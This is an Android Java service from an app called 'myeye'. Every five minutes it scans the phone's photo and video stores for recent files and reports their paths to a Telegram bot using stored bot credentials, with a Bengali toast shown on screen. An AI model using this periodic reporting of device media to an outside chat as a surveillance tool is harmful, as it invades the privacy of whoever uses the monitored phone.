package com.ahamedrahim.myeye;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.MediaStore;
import android.widget.Toast;
import androidx.annotation.Nullable;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MediaScannerService extends Service {
    
    private DatabaseHelper databaseHelper;
    private boolean isRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        databaseHelper = new DatabaseHelper(this);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            startMediaScan();
        }
        return START_STICKY;
    }
    
    private void startMediaScan() {
        new MediaScanTask().execute();
    }
    
    private class MediaScanTask extends AsyncTask<Void, Void, List<String>> {
        
        @Override
        protected List<String> doInBackground(Void... voids) {
            List<String> newMedia = new ArrayList<>();
            
            // Scan for images
            String[] imageProjection = {MediaStore.Images.Media.DATA, 
                                       MediaStore.Images.Media.DATE_ADDED};
            Cursor imageCursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    imageProjection,
                    null,
                    null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
            );
            
            if (imageCursor != null) {
                while (imageCursor.moveToNext()) {
                    String path = imageCursor.getString(0);
                    long dateAdded = imageCursor.getLong(1);
                    
                    // Check if this is new media
                    if (isNewMedia(path, dateAdded)) {
                        newMedia.add("🖼️ Image: " + path);
                        databaseHelper.saveMediaLog("Image: " + path);
                    }
                }
                imageCursor.close();
            }
            
            // Scan for videos
            String[] videoProjection = {MediaStore.Video.Media.DATA, 
                                       MediaStore.Video.Media.DATE_ADDED};
            Cursor videoCursor = getContentResolver().query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    videoProjection,
                    null,
                    null,
                    MediaStore.Video.Media.DATE_ADDED + " DESC"
            );
            
            if (videoCursor != null) {
                while (videoCursor.moveToNext()) {
                    String path = videoCursor.getString(0);
                    long dateAdded = videoCursor.getLong(1);
                    
                    if (isNewMedia(path, dateAdded)) {
                        newMedia.add("🎬 Video: " + path);
                        databaseHelper.saveMediaLog("Video: " + path);
                    }
                }
                videoCursor.close();
            }
            
            return newMedia;
        }
        
        @Override
        protected void onPostExecute(List<String> newMedia) {
            if (!newMedia.isEmpty()) {
                // Send to Telegram
                sendToTelegram(newMedia);
                
                // Show notification
                showNotification("নতুন মিডিয়া পাওয়া গেছে: " + newMedia.size() + " টি");
            }
            
            // Schedule next scan
            scheduleNextScan();
        }
    }
    
    private boolean isNewMedia(String path, long dateAdded) {
        // Check if file exists
        File file = new File(path);
        if (!file.exists()) {
            return false;
        }
        
        // Check if already logged in database (simplified logic)
        // In real app, you'd check database for this file
        long currentTime = System.currentTimeMillis() / 1000;
        long timeDiff = currentTime - dateAdded;
        
        // Consider media as new if created within last 24 hours
        return timeDiff < 86400;
    }
    
    private void sendToTelegram(List<String> mediaList) {
        TelegramBotManager botManager = new TelegramBotManager(this);
        String botToken = databaseHelper.getSetting("bot_token");
        String chatId = databaseHelper.getSetting("chat_id");
        
        if (botToken != null && !botToken.isEmpty() && 
            chatId != null && !chatId.isEmpty()) {
            
            StringBuilder message = new StringBuilder("📸 নতুন মিডিয়া পাওয়া গেছে:\n");
            for (String media : mediaList) {
                message.append("• ").append(media).append("\n");
            }
            
            botManager.sendMessage(botToken, chatId, message.toString());
        }
    }
    
    private void showNotification(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }
    
    private void scheduleNextScan() {
        // Schedule next scan after 5 minutes
        android.os.Handler handler = new android.os.Handler();
        handler.postDelayed(() -> {
            if (isRunning) {
                startMediaScan();
            }
        }, 5 * 60 * 1000); // 5 minutes
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        if (databaseHelper != null) {
            databaseHelper.close();
        }
        super.onDestroy();
    }
              }
